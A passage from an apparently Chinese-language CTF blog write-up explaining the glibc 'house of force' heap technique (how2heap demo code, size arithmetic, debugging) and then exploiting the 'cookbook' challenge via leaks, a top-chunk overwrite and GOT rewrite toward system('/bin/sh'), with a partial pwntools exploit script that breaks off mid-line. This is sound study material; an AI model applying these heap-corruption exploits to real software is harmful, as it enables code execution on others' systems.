class="line"></span><br><span class="line">	fprintf(stderr, &quot;\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n&quot;</span><br><span class="line">	   &quot;Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n&quot;</span><br><span class="line">	   &quot;overflow) and will then be able to allocate a chunk right over the desired region.\n&quot;);</span><br><span class="line"></span><br><span class="line">	&#x2F;*</span><br><span class="line">	 * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):</span><br><span class="line">	 * new_top &#x3D; old_top + nb</span><br><span class="line">	 * nb &#x3D; new_top - old_top</span><br><span class="line">	 * req + 2sizeof(long) &#x3D; new_top - old_top</span><br><span class="line">	 * req &#x3D; new_top - old_top - 2sizeof(long)</span><br><span class="line">	 * req &#x3D; dest - 2sizeof(long) - old_top - 2sizeof(long)</span><br><span class="line">	 * req &#x3D; dest - old_top - 4*sizeof(long)</span><br><span class="line">	 *&#x2F;</span><br><span class="line">	unsigned long evil_size &#x3D; (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;</span><br><span class="line">	fprintf(stderr, &quot;\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n&quot;</span><br><span class="line">	   &quot;we will malloc %#lx bytes.\n&quot;, bss_var, ptr_top, evil_size);</span><br><span class="line">	void *new_ptr &#x3D; malloc(evil_size);</span><br><span class="line">	fprintf(stderr, &quot;As expected, the new pointer is at the same place as the old top chunk: %p\n&quot;, new_ptr - sizeof(long)*2);</span><br><span class="line"></span><br><span class="line">	void* ctr_chunk &#x3D; malloc(100);</span><br><span class="line">	fprintf(stderr, &quot;\nNow, the next chunk we overwrite will point at our target buffer.\n&quot;);</span><br><span class="line">	fprintf(stderr, &quot;malloc(100) &#x3D;&gt; %p!\n&quot;, ctr_chunk);</span><br><span class="line">	fprintf(stderr, &quot;Now, we can finally overwrite that value:\n&quot;);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;... old string: %s\n&quot;, bss_var);</span><br><span class="line">	fprintf(stderr, &quot;... doing strcpy overwrite with \&quot;YEAH!!!\&quot;...\n&quot;);</span><br><span class="line">	strcpy(ctr_chunk, &quot;YEAH!!!&quot;);</span><br><span class="line">	fprintf(stderr, &quot;... new string: %s\n&quot;, bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; some further discussion:</span><br><span class="line">	&#x2F;&#x2F;fprintf(stderr, &quot;This controlled malloc will be called with a size parameter of evil_size &#x3D; malloc_got_address - 8 - p2_guessed\n\n&quot;);</span><br><span class="line">	&#x2F;&#x2F;fprintf(stderr, &quot;This because the main_arena-&gt;top pointer is setted to current av-&gt;top + malloc_size &quot;</span><br><span class="line">	&#x2F;&#x2F;	&quot;and we \nwant to set this result to the address of malloc_got_address-8\n\n&quot;);</span><br><span class="line">	&#x2F;&#x2F;fprintf(stderr, &quot;In order to do this we have malloc_got_address-8 &#x3D; p2_guessed + evil_size\n\n&quot;);</span><br><span class="line">	&#x2F;&#x2F;fprintf(stderr, &quot;The av-&gt;top after this big malloc will be setted in this way to malloc_got_address-8\n\n&quot;);</span><br><span class="line">	&#x2F;&#x2F;fprintf(stderr, &quot;After that a new call to malloc will return av-&gt;top+8 ( +8 bytes for the header ),&quot;</span><br><span class="line">	&#x2F;&#x2F;	&quot;\nand basically return a chunk at (malloc_got_address-8)+8 &#x3D; malloc_got_address\n\n&quot;);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F;fprintf(stderr, &quot;The large chunk with evil_size has been allocated here 0x%08x\n&quot;,p2);</span><br><span class="line">	&#x2F;&#x2F;fprintf(stderr, &quot;The main_arena value av-&gt;top has been setted to malloc_got_address-8&#x3D;0x%08x\n&quot;,malloc_got_address);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F;fprintf(stderr, &quot;This last malloc will be served from the remainder code and will return the av-&gt;top+8 injected before\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里面最重要的应该就是这个计算过程了，我把步骤解释写一下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></span><br><span class="line">new_top = old_top + nb</span><br><span class="line"><span class="comment">//remainder = ↑chunk_at_offset (victim, nb);源码中这里remainder对应的就是new_top，victim此时就是old_top</span></span><br><span class="line"></span><br><span class="line">nb = new_top - old_top</span><br><span class="line">req + <span class="number">2</span><span class="keyword">sizeof</span>(<span class="keyword">long</span>) = new_top - old_top<span class="comment">//这里分解nb</span></span><br><span class="line">req = new_top - old_top - <span class="number">2</span><span class="keyword">sizeof</span>(<span class="keyword">long</span>)</span><br><span class="line">req = dest - <span class="number">2</span><span class="keyword">sizeof</span>(<span class="keyword">long</span>) - old_top - <span class="number">2</span><span class="keyword">sizeof</span>(<span class="keyword">long</span>)<span class="comment">//dest = new_top + 2sizeof(long)</span></span><br><span class="line">req = dest - old_top - <span class="number">4</span>*<span class="keyword">sizeof</span>(<span class="keyword">long</span>)</span><br></pre></td></tr></table></figure>

<p>其中最主要的是通过<code>chunk_at_offset(p, s)</code>这个Macro来获得victim的时候，nb为负数时会把topchunk的位置往回放</p>
<p>但是<code>_int_malloc</code>最开始对我们申请的bytes做的检查是这样的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                 \</span></span><br><span class="line">  ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (req) &gt;=						      \</span><br><span class="line">   (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (INTERNAL_SIZE_T) (<span class="number">-2</span> * MINSIZE))</span><br><span class="line"><span class="comment">//MINSIZE:x64 0x20,x86 0x10 </span></span><br><span class="line"><span class="comment">//-2*MINSIZE=0xFFFF FFFF FFFF FFC0(x64),0xFFFF FFE0(x86)</span></span><br><span class="line"><span class="comment">//req会被转换成unsigned long，只要我们通过上面的这个检查就可以过第一步了</span></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                         \</span></span><br><span class="line">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="line">   MINSIZE :                                                      \</span><br><span class="line">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  Same, except also perform argument check */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> checked_request2size(req, sz)                             \</span></span><br><span class="line">  <span class="keyword">if</span> (REQUEST_OUT_OF_RANGE (req)) &#123;					      \</span><br><span class="line">      __set_errno (ENOMEM);						      \</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;								      \</span><br><span class="line">    &#125;									      \</span><br><span class="line">  (sz) = request2size (req);</span><br></pre></td></tr></table></figure>

<p>然后用一个负数的nb去topchunk申请chunk，当然其中经过smallbin range检查的时候还调用了<code>malloc_consolidate</code></p>
<p>用topchunk的size和nb作比对的时候都是转换成了unsigned long：此时<code>-1</code>计算出来的size是最大的，可以通过该检查：<code>(unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)</code></p>
<h2 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h2><p>先不急着debug示例程序，我自己准备用自己的程序试一试，具体如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *fast=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">	<span class="keyword">char</span> *p=<span class="built_in">malloc</span>(<span class="number">0xff0</span>);</span><br><span class="line">	<span class="built_in">free</span>(fast);<span class="comment">//use for test</span></span><br><span class="line">	*(<span class="keyword">int64_t</span> *)(p+<span class="number">0xff8</span>)=(<span class="keyword">long</span> <span class="keyword">long</span>)<span class="number">-1</span>;<span class="comment">//set top_chunk size</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">char</span> *p2=<span class="built_in">malloc</span>(<span class="number">0xFFFFFFFFFFFFF000</span><span class="number">-2</span>*<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));<span class="comment">//set new_top </span></span><br><span class="line">	<span class="keyword">char</span> *p3=<span class="built_in">malloc</span>(<span class="number">0x100</span>);<span class="comment">//the same address as p</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%p,%p"</span>,p,p3);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我写了一个简单的程序，其中0x30的chunk是用来debug的时候看是否调用了<code>malloc_consolidate</code></p>
<p>设置top_chunk size之后：</p>
<img src="/2020/02/22/how2heap-house-of-force-cookbook%E3%80%81bcloud/1582041965701.png" width="90%" height="90%">

<p>可以看到pwndbg的脚本报错了，不过我们直接看地址偏移还是一样的</p>
<p>然后<code>char *p2=malloc(0xFFFFFFFFFFFFF000-2*sizeof(size_t));</code>这一行的意思是传入一个<code>-0x1000-2*size_t</code>的值，计算nb时会补成<code>-0x1000</code>，通过两道检查后在源码中这里:<code>remainder = chunk_at_offset (victim, nb)</code>，remainder是用来设置新的top_chunk的，所以我们直接就把top_chunk往回放到我们之前申请的0x1000的chunk处去了。</p>
<p>因为chunksize计算时会除去低三位，所以<code>remainder_size = size - nb;</code>这一步中的size实际上是<code>0xfffffffffffffff8</code><br>，减去nb(-0x1000)之后就变成了<code>0xff8</code>，如果我们想要之后的top_chunk能再大一些显然做不到了，因为要通过<code>(unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)</code>这个检查</p>
<p>再就是设置top_chunk size的时候，虽然说计算size时低三位是没用的，但是最后一位必须为1，要不然在<code>_libc_malloc</code>里面的<code>arena_get</code>好像会出问题（待深入）</p>
<p>以上内容执行时如下：</p>
<img src="/2020/02/22/how2heap-house-of-force-cookbook%E3%80%81bcloud/1582042913527.png" width="90%" height="90%">

<p>可以看到新的top_chunk已经被设置成了我们之前0x1000 chunk的地址</p>
<img src="/2020/02/22/how2heap-house-of-force-cookbook%E3%80%81bcloud/1582043050649.png" width="90%" height="90%">

<p>最后的运行效果就是这样：</p>
<p><img src="/2020/02/22/how2heap-house-of-force-cookbook%E3%80%81bcloud/1582043111462.png" alt="1582043111462"></p>
<p>两个指针指向的chunk是一样的，也验证了<code>req = dest - old_top - 4*sizeof(long)</code></p>
<hr>
<p>然后再来debug示例代码（这里很简略）</p>
<p>所以上面示例代码中把topchunk的size改成了-1，然后计算出的<code>evil_size=0xffffffffffafcf30</code>当然也通过了检查</p>
<img src="/2020/02/22/how2heap-house-of-force-cookbook%E3%80%81bcloud/1582080713143.png" width="80%" height="80%">

<p>可以看到这里算出来的remainder就是0x602050了，刚好是我们<code>字符串地址-0x10</code>的位置，所以再malloc的时候就可以malloc出这块内存，至于后面注释的那一部分，大致意思就差不多是我们可以通过这个方法来修改GOT表，暂时就不debug了</p>
<p>当然这上面是因为没有开ASLR，bss和top_chunk比较近,如果开启PIE加上ASLR的效果也是一样的：</p>
<img src="/2020/02/22/how2heap-house-of-force-cookbook%E3%80%81bcloud/1582082667248.png" width="80%" height="80%">

<p>一样申请到了这块内存</p>
<p>接下来肝题吧</p>
<h1 id="cookbook"><a href="#cookbook" class="headerlink" title="cookbook"></a>cookbook</h1><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>emmm…怎么说呢，感觉以后分析这种程序得换换思路了，以前都是拿着题就往IDA拖了分析，现在看来程序复杂度够高的时候直接这样分析好像不太行，工作量太大，而且根本没有思路，对于量大一点的题得先跑熟悉有个印象再去写，熟悉逻辑之后再去逆会快很多</p>
<p>下面就写一些大致的，后面会放一个总结的图，说不定以后程序分析就都是总结的图了，因为程序每个细节都扣到会浪费时间，能找到漏洞然后利用才是王道啊</p>
<h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p><img src="/2020/02/22/how2heap-house-of-force-cookbook%E3%80%81bcloud/1582247560625.png" alt="1582247560625"></p>
<p>main大致对应的就是这些东西，Rec代表recipe，Ing代表Ingredient，<code>main_menu</code>是我们操作主菜单，之前做的都是初始化操作</p>
<h3 id="init-RecAndIng"><a href="#init-RecAndIng" class="headerlink" title="init_RecAndIng"></a>init_RecAndIng</h3><p>这个函数分为两个子函数，第一个差不多是下面这样子的，主要做初始化Ingredient的操作</p>
<p><code>add_ingredient</code>是<code>calloc(0x90)</code>一个ingredient的结构体，等下放一张图给自己看吧</p>
<p><code>Ingredient_ListHeader</code>是存在.bss段上的一个链表头指针。<code>LinkList_add</code>就是往这个头指针添加结点，<code>calloc(0x8)</code>，然后存一个next指针一个数据</p>
<img src="/2020/02/22/how2heap-house-of-force-cookbook%E3%80%81bcloud/1582247755837.png" width="60%" height="60%">

<p>第二个子函数就是初始化三个recipe（0x40C），当时直接拿着程序看的时候在这浪费了很多时间，因为根本不知道要干什么，以后碰到这种就先跑一下程序熟悉熟悉，看这些字符串出现在什么地方再逆，<code>ret_Ingredient_ptr</code>是根据name返回对应Ingredient结构体的指针Dish type应该不用管</p>
<img src="/2020/02/22/how2heap-house-of-force-cookbook%E3%80%81bcloud/1582248382621.png" width="100%" height="100%">

<p>不过这两个初始化函数用来逆结构体还是挺好的，这里把结构体放出来吧</p>
<h3 id="struct"><a href="#struct" class="headerlink" title="struct"></a>struct</h3><img src="/2020/02/22/how2heap-house-of-force-cookbook%E3%80%81bcloud/1582248526810.png" width="60%" height="60%">

<p>再来看<code>main_menu</code></p>
<h3 id="main-menu"><a href="#main-menu" class="headerlink" title="main_menu"></a>main_menu</h3><img src="/2020/02/22/how2heap-house-of-force-cookbook%E3%80%81bcloud/1582248585103.png" width="45%" height="45%">

<p>就是我们正常的菜单选择了，这里就不做细致分析了，没必要，我下面的这张图记录了每个函数大致的操作</p>
<h3 id="All-in-one"><a href="#All-in-one" class="headerlink" title="All in one"></a>All in one</h3><p><img src="/2020/02/22/how2heap-house-of-force-cookbook%E3%80%81bcloud/1582249392325.png" alt="1582249392325"></p>
<p>所有对应的选项我都记录了大致对应的操作，当然也不乏在调试中发现的一些小细节，比如creat recipe里面是删不掉Ingredient的，因为fegts结尾的<code>\n</code>程序没有处理，导致<code>strcmp</code>比对失败…</p>
<p>最后程序通过链表和不同结构体的管理如下图所示，我这里只拿了一个Ingredient和Recipe做示例</p>
<p><img src="/2020/02/22/how2heap-house-of-force-cookbook%E3%80%81bcloud/1582213398090.png" alt="1582213398090"></p>
<h2 id="漏洞分析-amp-Exploite"><a href="#漏洞分析-amp-Exploite" class="headerlink" title="漏洞分析&amp;Exploite"></a>漏洞分析&amp;Exploite</h2><h3 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h3><p>这个题的leak其实只要有经验的话应该马上就能想到，没有经验的话像我可能还稍微想了一段时间吧，当然也要注意这里面的chunk很多都是calloc出来的。当时我在想leak构造的时候第一反应是 creat recipe里面free时没有对current_pt赋值0，所以存在一个bad save，然后就可以打印出对应的东西，这里只有一个recipe chunk被free的时候就可以打印出来这个unsortedbin chunk上的*(*bk)处的值，这里是top_chunk的地址。</p>
<p>后来我想通过remove ingredient来给ingredient chunk的fd和bk处放上libc地址结果失败了，因为我发现这里根本删不了..坑，还以为是出了什么问题，不过依旧是这个思路，由于我们current_ptr是保存在.bss上的，所以我们可以，出去删了这个ingredient之后再回到这里leak，这样在打印price的时候就会leaklibc了，注意数量一定要设置1</p>
<h3 id="Arbitrary-write"><a href="#Arbitrary-write" class="headerlink" title="Arbitrary write"></a>Arbitrary write</h3><p>本题还有一个0x8C的大overflow我们没有用到，最开始我想的是能不能通过fastbin来attack一个地方，后来发现没什么思路就放弃了，因为house_of_force的方法在这里更明显一些，我们可以直接通过这个大overflow来修改top_chunk然后改写GOT表，最后调用<code>system(&quot;/bin/sh&quot;)</code>。当然改GOT表的过程特别玄学，由于只有Ingredient和cookbook name是malloc出来的，而bookname在我这个方法里面要在设置top_size之后用来设置new top的位置，所以我这里不能用bookname来更改GOT表，只能用Ingredient，但是调试过程中确实踩了很多坑，最后对应ingredient的位置很苛刻</p>
<img src="/2020/02/22/how2heap-house-of-force-cookbook%E3%80%81bcloud/1582252497984.png" width="80%" height="80%">

<p>从前往后试这两个地方用来在设置topchunk的时候写size，前面的内存是不可写的(这里写一笔给记性差的自己：因为32位chunk要8bit对齐，所以只有结尾是4和C的地方才写size)，而后malloc ingredient时因为输入Ingredient-&gt;name的时候程序会calloc一块chunk出来，也就意味着0x98Bytes后的数据全部会被清零，所以很多数据都会受到连锁影响(跪。而且我试0x0804D004这个地方的时候发现，后面的malloc居然刚好把currentIng_ptr给设置成size字段了，以后在这些数据段操作之前一定先看看后面的一些特殊偏移有什么数据（….<code>&amp;currentIng_ptr-0x0804D000=0x9C(malloc_usable_size)</code>）出题人应该是估计苛刻的？<br>然后用0x0804D00C这个地方用来写size，最后使用哪个表作为system我用的是atoi（好像用free更方便一点）。然后输入name的时候由于fgets会损坏一个Byte的数据，所以我干脆把一些表项全填上去了，当我把要利用的函数的偏移一个个的填上去之后发现，利用的时候由于memcpy是cpy0x80个字节的数据，刚好把bss上的stdin和stdout给写没了，所以又去把stdin和stdout的地址写了上去才成功</p>
<h2 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> numpy</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'cookbook'</span>	<span class="comment">#binary's name here</span></span><br><span class="line">context.binary = binary		<span class="comment">#context here</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">pty = process.PTY</span><br><span class="line">p = process(binary, aslr = <span class="number">1</span>, stdin=pty, stdout=pty)	<span class="comment">#process option here</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Host =</span></span><br><span class="line"><span class="string">Port =</span></span><br><span class="line"><span class="string">p = remote(Host,Port)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">my_u64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">my_u32 = <span class="keyword">lambda</span> x: u32(x.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">ub_offset = <span class="number">0x3c4b30</span></span><br><span class="line">codebase = <span class="number">0x555555554000</span></span><br><span class="line"><span class="comment">#log.info("\033[1;36m" +''+hex() + "\033[0m")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># todo here</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main_choice</span><span class="params">(cha)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'[q]uit\n'</span>)</span><br><span class="line">	p.sendline(cha)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Ing_choice</span><span class="params">(cha)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'quit)?\n'</span>)</span><br><span class="line">	p.sendline(cha)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recipe_choice</span><span class="params">(cha)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'[q]uit\n'</span>)</span><br><span class="line">	p.sendline(cha)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">creat_for_leak</span><span class="params">()</span>:</span></span><br><span class="line">	main_choice(<span class="string">'a'</span>)</span><br><span class="line">	Ing_choice(<span class="string">'n'</span>)</span><br><span class="line">	Ing_choice(<span class="string">'g'</span>)</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.sendline(<span class="string">'********'</span>)</span><br><span class="line">	Ing_choice(<span class="string">'e'</span>)</span><br><span class="line">	Ing_choice(<span class="string">'q'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">creat_for_fill</span><span class="params">()</span>:</span></span><br><span class="line">	main_choice(<span class="string">'a'</span>)</span><br><span class="line">	Ing_choice(<span class="string">'n'</span>)</span><br><span class="line">	Ing_choice(<span class="string">'g'</span>)</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.sendline(<span class="string">'********'</span>)</span><br><span class="line">	Ing_choice(<span class="string">'e'</span>)</span><br><span class="line">	Ing_choice(<span class="string">'q'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_heap</span><span class="params">()</span>:</span></span><br><span class="line">	main_choice(<span class="string">'c'</span>)</span><br><span class="line">	recipe_choice(<span class="string">'n'</span>)</span><br><span class="line">	recipe_choice(<span class="string">'a'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'to add? '</span>)</span><br><span class="line">	p.sendline(<span class="string">'********'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'many? (hex): '</span>)</span><br><span class="line">	p.sendline(<span class="string">'0x1'</span>)</span><br><span class="line">	recipe_choice(<span class="string">'d'</span>)</span><br><span class="line">	recipe_choice(<span class="string">'p'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">	heap_base=int(p.recvuntil(<span class="string">' -'</span>).strip(<span class="string">' -'</span>))<span class="number">-0x1780</span></span><br><span class="line">	recipe_choice(<span class="string">'q'</span>)</span><br><span class="line">	<span class="keyword">return</span> heap_base</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span><span class="params">()</span>:</span></span><br><span class="line">	main_choice(<span class="string">'c'</span>)</span><br><span class="line">	recipe_choice(<span class="string">'n'</span>)</span><br><span class="line">	recipe_choice(<span class="string">'a'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'to add? '</span>)</span><br><span class="line">	p.sendline(<span class="string">'********'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'many? (hex): '</span>)</span><br><span class="line">	p.sendline(<span class="string">'0x1'</span>)</span><br><span class="line">	recipe_choice(<span class="string">'q'</span>)</span><br><span class="line">	main_choice(<span class="string">'e'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'exterminate? '</span>)</span><br><span class="line">	p.sendline(<span class="string">'********'</span>)</span><br><span class="line">	main_choice(<span class="string">'c'</span>)</span><br><span class="line">	recipe_choice(<span class="string">'p'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'$'</span>)</span><br><span class="line">	libc_base=int(p.recvuntil(<span class="string">'\n'</span>).strip(<span class="string">'\n'</span>))<span class="number">-0x1b27b0</span></span><br><span class="line">	recipe_choice(<span class="string">'q'</span>)</span><br><span class="line">	<span class="keyword">return</span> libc_base</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_topsize</span><span class="params">()</span>:</span></span><br><span class="line">	main_choice(<span class="string">'c'</span>)</span><br><span class="line">	recipe_choice(<span class="string">'g'</span>)</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.sendline(<span class="string">'a'</span>*<span class="number">0x3c0</span>+p32(<span class="number">0xffffffff</span>))</span><br><span class="line">	recipe_choice(<span class="string">'q'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'your name?\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'ljc'</span>)</span><br><span class="line"></span><br><span class="line">creat_for_leak()</span><br><span class="line">heap_base=leak_heap()</span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> +<span class="string">'heap_base:'</span>+hex(heap_base) + <span class="string">"\033[0m"</span>)</span><br><span class="line">libc_base=leak_libc()</span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> +<span class="string">'libc_base:'</span>+hex(libc_base) + <span class="string">"\033[0m"</span>)</span><br><span class="line"></span><br><span class="line">creat_for_fill()</span><br><span class="line">set_topsize()</span><br><span class="line"></span><br><span class="line"><span class="comment">#new_top-&gt;0x0804D000</span></span><br><span class="line"><span class="comment">#req = dest - old_top - 4*sizeof(long)</span></span><br><span class="line">req =numpy.array([<span class="number">0x0804D010</span>,],dtype=numpy.uint32)</span><br><span class="line">main_choice(<span class="string">'g'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'hacker!) : '</span>)</span><br><span class="line">req[<span class="number">0</span>]=req[<span class="number">0</span>]-(heap_base+<span class="number">0x17a0</span>)<span class="number">-4</span>*<span class="number">4</span></span><br><span 